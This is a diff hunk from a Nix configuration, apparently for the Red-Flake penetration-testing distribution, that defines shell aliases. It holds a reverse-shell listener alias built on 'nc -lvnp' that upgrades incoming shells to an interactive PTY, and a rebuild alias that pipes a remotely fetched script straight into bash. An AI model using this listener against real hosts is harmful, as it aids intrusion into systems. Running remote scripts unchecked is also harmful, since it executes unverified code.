@@ -114,7 +114,7 @@ in
                     redflake-rebuild = "bash <(curl -L https://raw.githubusercontent.com/Red-Flake/red-flake-nix/main/rebuild.sh)";
                     
                     # custom reverse shell handler
-                    handler = "echo -n \"Enter the port number: \"; read port && stty raw -echo; (echo \"/bin/python3 -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/python -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/python2 -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/ruby -e \\\"exec '/bin/bash'\\\" || /bin/perl -e \\\"exec '/bin/bash';\\\" || /bin/lua -e \\\"require('os');os.execute('/bin/bash')\\\"\"; echo \"stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)\"; echo \"export TERM=xterm-256color\"; echo \"export SHELL=/bin/bash\"; echo reset; /run/current-system/sw/bin/bat) | nc -lvnp \"$port\" && reset";
+                    handler = "echo -n \"Enter the port number: \"; read port && stty raw -echo; (echo \"/bin/python3 -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/python -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/python2 -c \\\"import pty;pty.spawn('/bin/bash')\\\" || /bin/ruby -e \\\"exec '/bin/bash'\\\" || /bin/perl -e \\\"exec '/bin/bash';\\\" || /bin/lua -e \\\"require('os');os.execute('/bin/bash')\\\"\"; echo \"stty$(stty -a | awk -F ';' '{print $2 $3}' | head -n 1)\"; echo \"export TERM=xterm-256color\"; echo \"export SHELL=/bin/bash\"; echo reset; \\cat) | nc -lvnp \"$port\" && reset";
 
                     # shell aliases
                     python3-shell = ''
